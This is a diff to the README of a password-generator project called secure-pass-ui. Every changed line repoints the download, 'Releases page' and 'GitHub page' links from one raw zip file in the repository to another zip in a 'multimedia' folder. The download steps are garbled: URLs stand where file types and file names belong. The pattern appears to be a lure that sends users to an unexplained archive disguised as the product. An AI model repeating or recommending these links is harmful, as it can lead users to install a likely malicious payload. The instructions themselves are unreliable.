@@ -29,9 +29,9 @@ This project covers the following topics:
 
 To get started, visit the Releases page to download secure-pass-ui. 
 
-[![Download Secure Pass UI](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip)
+[![Download Secure Pass UI](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip)
 
-Click the button above or follow this link: [Download secure-pass-ui](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip).
+Click the button above or follow this link: [Download secure-pass-ui](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip).
 
 ### 🚦 System Requirements
 
@@ -40,11 +40,11 @@ Click the button above or follow this link: [Download secure-pass-ui](https://ra
 
 ### 📥 Steps to Download
 
-1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip).
 2. **Select a Release**: Choose the latest version listed at the top of the page.
-3. **Download the File**: Click on the appropriate file link to download the application. This is usually a `.zip` or `https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip` file.
+3. **Download the File**: Click on the appropriate file link to download the application. This is usually a `.zip` or `https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip` file.
 4. **Unzip the File**: After the download completes, unzip the file to access the contents.
-5. **Open Your Browser**: Navigate to the `https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip` file in the extracted folder.
+5. **Open Your Browser**: Navigate to the `https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip` file in the extracted folder.
 6. **Enjoy Secure Passwords**: Start generating strong passwords right away.
 
 ## ⚙️ Using secure-pass-ui
@@ -76,7 +76,7 @@ This project is open-source and available under the MIT License. See the LICENSE
 
 ## 🔗 More Information
 
-You can find additional resources and updates on our [GitHub page](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/js/ui-secure-pass-3.1-alpha.4.zip). 
+You can find additional resources and updates on our [GitHub page](https://raw.githubusercontent.com/syakemeshi/secure-pass-ui/main/multimedia/secure_ui_pass_v2.0.zip). 
 
 Remember to check the Releases page for the latest updates, features, and improvements.
 
